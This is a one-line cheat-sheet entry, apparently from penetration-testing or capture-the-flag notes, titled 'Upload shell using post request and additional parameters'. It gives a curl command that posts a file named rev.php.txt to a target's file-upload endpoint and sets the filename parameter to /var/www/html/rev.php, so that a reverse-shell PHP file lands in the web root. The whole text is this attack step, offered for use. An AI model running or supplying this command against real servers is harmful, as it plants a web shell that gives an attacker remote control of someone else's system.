
Upload shell using post request and additional parameters:
---
```sh
curl -X POST "$TARGET_URL/file-upload" -F "file=@rev.php.txt" -F "filename=/var/www/html/rev.php"
```